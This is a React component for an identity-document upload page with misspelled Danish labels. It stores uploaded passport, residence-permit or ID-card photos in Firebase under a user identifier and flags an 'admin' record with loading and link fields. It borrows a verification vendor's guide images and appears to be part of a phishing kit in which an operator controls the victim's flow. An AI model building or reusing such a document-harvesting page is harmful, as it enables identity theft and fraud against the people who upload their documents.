import React, { useEffect, useState } from "react";
import { useTranslation } from "react-i18next";
import { getStorage, ref, uploadBytes } from "firebase/storage";
import { useOutletContext } from "react-router-dom";
import { doc, updateDoc } from "firebase/firestore";
import { db } from "../../../firebase";

function Docs() {
  const storage = getStorage();
  const [identifier, setIdentifier] = useOutletContext();
  const { t } = useTranslation();
  const [front, setFront] = useState(null);
  const [back, setBack] = useState(null);
  const [passport, setPass] = useState(null);
  const [isPassport, setIsPassport] = useState(true);
  const [backDataURL, setbackDataURL] = useState(null);
  const [frontDataURL, setfrontDataURL] = useState(null);
  const [passportDataURL, setPassportDataURL] = useState(null);

  const changeFront = (e) => {
    const file = e.target.files[0];
    setFront(file);
  };
  const changeBck = (e) => {
    const file = e.target.files[0];
    setBack(file);
  };
  const changePass = (e) => {
    const file = e.target.files[0];
    setPass(file);
  };

  const submitCard = async () => {
    if (!front || !back) return;

    const userRef = ref(storage, identifier);
    const spaceRef = ref(userRef, "Cards");
    const result = await Promise.all(
      [front, back].map((file) => {
        const imageRef = ref(spaceRef, file?.name);

        return uploadBytes(imageRef, file);
      })
    );

    //Update Admin Panel
    if (result) {
      await updateDoc(doc(db, "admin", identifier), {
        loading: true,
        link: "",
      });
    }
  };

  const submitPssport = async () => {
    if (!passport) return;

    const userRef = ref(storage, identifier);
    const spaceRef = ref(userRef, "Pass");
    const imageRef = ref(spaceRef, passport?.name);
    const result = await uploadBytes(imageRef, passport);
    
    //Update Admin Panel
    if (result) {
      await updateDoc(doc(db, "admin", identifier), {
        loading: true,
        link: "",
      });
    }
  };
  useEffect(() => {
    let fileReader,
      isCancel = false;
    if (front) {
      fileReader = new FileReader();
      fileReader.onload = (e) => {
        const { result } = e.target;
        if (result && !isCancel) {
          setfrontDataURL(result);
        }
      };
      fileReader.readAsDataURL(front);
    }
    return () => {
      isCancel = true;
      if (fileReader && fileReader.readyState === 1) {
        fileReader.abort();
      }
    };
  }, [front]);
  useEffect(() => {
    let fileReader,
      isCancel = false;
    if (back) {
      fileReader = new FileReader();
      fileReader.onload = (e) => {
        const { result } = e.target;
        if (result && !isCancel) {
          setbackDataURL(result);
        }
      };
      fileReader.readAsDataURL(back);
    }
    return () => {
      isCancel = true;
      if (fileReader && fileReader.readyState === 1) {
        fileReader.abort();
      }
    };
  }, [back]);
  useEffect(() => {
    let fileReader,
      isCancel = false;
    if (passport) {
      fileReader = new FileReader();
      fileReader.onload = (e) => {
        const { result } = e.target;
        if (result && !isCancel) {
          setPassportDataURL(result);
        }
      };
      fileReader.readAsDataURL(passport);
    }
    return () => {
      isCancel = true;
      if (fileReader && fileReader.readyState === 1) {
        fileReader.abort();
      }
    };
  }, [passport]);

  return (
    <div className="max-w-md m-auto">
      <div className="py-3 px-7  min-h-[60vh] bg-white shadow-lg mt-12 rounded-xl">
        <div className="flex flex-col gap-10 justify-between items-center  mb-10">
          <section className="w-full flex justify-center font-bold">
            BILLEDE-ID
          </section>
          <section className="w-full">
            <div className="text-sm font-bold mb-4">Vaelg dokument</div>
            <div className="text-sm">
              <div className="flex items-center mb-1">
                <input
                  defaultChecked
                  onChange={() => setIsPassport(true)}
                  id="default-radio-1"
                  type="radio"
                  name="default-radio"
                  className="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 "
                />

                <label
                  htmlFor="checked-checkbox"
                  className="ml-2 text-sm font-medium "
                >
                  Opholdstilladelse
                </label>
              </div>
              <div className="flex items-center">
                <input
                  onChange={() => setIsPassport(false)}
                  id="default-radio-1"
                  type="radio"
                  name="default-radio"
                  className="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300"
                />

                <label
                  htmlFor="checked-checkbox"
                  className="ml-2 text-sm font-medium "
                >
                  Pas
                </label>
              </div>
            </div>
          </section>
          <section className="w-full ">
            <div className="text-sm font-bold mb-4">
              Tag et billede af Korekort. Billedet skai <br /> Vaere :
            </div>
            <div className="text-sm mb-4">
              <ul>
                <li className="text-blue-800 font-semibold">
                  Lyst og tydeligt{" "}
                  <span className="text-xs font-normal">(god kvalitech)</span>
                </li>
                <li className="text-blue-800 font-semibold">
                  ubeskaret{" "}
                  <span className="text-xs font-normal">
                    (alle hjorner skal varere synline)
                  </span>
                </li>
              </ul>
            </div>
            <div className="w-full flex justify-between items-center gap-4 ">
              <span>
                <img
                  src={
                    !isPassport
                      ? "https://static.sumsub.com/idensic/img/i_passport_correct.e3e8efdd.png"
                      : "https://static.sumsub.com/idensic/img/i_idcard_correct.e6412a46.png"
                  }
                  alt=""
                />
              </span>
              <span>
                <img
                  src={
                    !isPassport
                      ? "https://static.sumsub.com/idensic/img/i_passport_incorrect_1.293168d3.png"
                      : "https://static.sumsub.com/idensic/img/i_idcard_incorrect_1.42c3b612.png"
                  }
                  alt=""
                />
              </span>
              <span>
                <img
                  src={
                    !isPassport
                      ? "https://static.sumsub.com/idensic/img/i_passport_incorrect_1.293168d3.png"
                      : "https://static.sumsub.com/idensic/img/i_idcard_incorrect_2.c13c1bd7.png"
                  }
                  alt=""
                />
              </span>
            </div>
          </section>
          {/* passport upload */}
          {!isPassport ? (
            <section className="w-full flex justify-center items-center">
              {!passport ? (
                <div className="flex items-center justify-center w-full">
                  <label
                    htmlFor="dropzone-file"
                    className="flex flex-col items-center justify-center w-full h-36  border-dashed rounded-lg cursor-pointer shadow-md"
                  >
                    <div className="flex flex-col items-center justify-center pt-5 pb-6">
                      <svg
                        aria-hidden="true"
                        className="w-10 h-10 mb-3 text-gray-400"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"
                        ></path>
                      </svg>
                      <p className="mb-2 text-sm text-gray-500 dark:text-gray-400">
                        <span className="font-semibold">upload</span>{" "}
                        <span className="text-green-500"> froshiden </span>
                        <span className="font-semibold">af dit document</span>
                      </p>
                    </div>
                    <input
                      onChange={changePass}
                      id="dropzone-file"
                      type="file"
                      className="hidden"
                    />
                  </label>
                </div>
              ) : (
                <div className="flex items-center justify-center w-full relative">
                  {passportDataURL ? (
                    <p
                      className="hover:cursor-pointer"
                      onClick={() => [setPass(null)]}
                    >
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width={70}
                        height={70}
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth={2}
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        className="feather feather-trash-2 absolute top-1/3 left-[43%] bg-red-400 p-4 rounded-full"
                      >
                        <polyline points="3 6 5 6 21 6" />
                        <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" />
                        <line x1={10} y1={11} x2={10} y2={17} />
                        <line x1={14} y1={11} x2={14} y2={17} />
                      </svg>

                      {<img src={passportDataURL} alt="preview" />}
                    </p>
                  ) : null}
                </div>
              )}
            </section>
          ) : (
            <>
              {/* front upload */}
              <section className="w-full flex justify-center items-center">
                {!front ? (
                  <div className="flex items-center justify-center w-full">
                    <label
                      htmlFor="dropzone-file"
                      className="flex flex-col items-center justify-center w-full h-36  border-dashed rounded-lg cursor-pointer shadow-md"
                    >
                      <div className="flex flex-col items-center justify-center pt-5 pb-6">
                        <svg
                          aria-hidden="true"
                          className="w-10 h-10 mb-3 text-gray-400"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"
                          ></path>
                        </svg>
                        <p className="mb-2 text-sm text-gray-500 dark:text-gray-400">
                          <span className="font-semibold">upload</span>{" "}
                          <span className="text-green-500"> froshiden </span>
                          <span className="font-semibold">af dit document</span>
                        </p>
                      </div>
                      <input
                        onChange={changeFront}
                        id="dropzone-file"
                        type="file"
                        className="hidden"
                      />
                    </label>
                  </div>
                ) : (
                  <div className="flex items-center justify-center w-full relative">
                    {frontDataURL ? (
                      <p
                        className="hover:cursor-pointer"
                        onClick={() => [setFront(null)]}
                      >
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width={70}
                          height={70}
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          strokeWidth={2}
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          className="feather feather-trash-2 absolute top-1/3 left-[43%] bg-red-400 p-4 rounded-full"
                        >
                          <polyline points="3 6 5 6 21 6" />
                          <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" />
                          <line x1={10} y1={11} x2={10} y2={17} />
                          <line x1={14} y1={11} x2={14} y2={17} />
                        </svg>

                        {<img src={frontDataURL} alt="preview" />}
                      </p>
                    ) : null}
                  </div>
                )}
              </section>
              {/* back upload */}
              <section className="w-full flex justify-center items-center">
                {!back ? (
                  <div className="flex items-center justify-center w-full">
                    <label
                      htmlFor="dropzone-file"
                      className="flex flex-col items-center justify-center w-full h-36  border-dashed rounded-lg cursor-pointer shadow-md"
                    >
                      <div className="flex flex-col items-center justify-center pt-5 pb-6">
                        <svg
                          aria-hidden="true"
                          className="w-10 h-10 mb-3 text-gray-400"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"
                          ></path>
                        </svg>
                        <p className="mb-2 text-sm text-gray-500 dark:text-gray-400">
                          <span className="font-semibold">upload</span>{" "}
                          <span className="text-green-500"> back </span>
                          <span className="font-semibold">af dit document</span>
                        </p>
                      </div>
                      <input
                        onChange={changeBck}
                        id="dropzone-file"
                        type="file"
                        className="hidden"
                      />
                    </label>
                  </div>
                ) : (
                  <div className="flex items-center justify-center w-full relative">
                    {backDataURL ? (
                      <p
                        className="hover:cursor-pointer"
                        onClick={() => [setBack(null)]}
                      >
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width={70}
                          height={70}
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          strokeWidth={2}
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          className="feather feather-trash-2 absolute top-1/3 left-[43%] bg-red-400 p-4 rounded-full"
                        >
                          <polyline points="3 6 5 6 21 6" />
                          <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" />
                          <line x1={10} y1={11} x2={10} y2={17} />
                          <line x1={14} y1={11} x2={14} y2={17} />
                        </svg>

                        {<img src={backDataURL} alt="preview" />}
                      </p>
                    ) : null}
                  </div>
                )}
              </section>
            </>
          )}

          <section className="w-full flex justify-center">
            <button
              onClick={!isPassport ? () => submitPssport() : () => submitCard()}
              type="submit"
              className="text-white w-1/3 bg-[#2f51e9] font-medium rounded-sm text-sm outline-none  px-5 py-2.5 text-center flex justify-between"
            >
              <p>Naeste trin</p>
            </button>
          </section>
        </div>
      </div>
    </div>
  );
}

export default Docs;
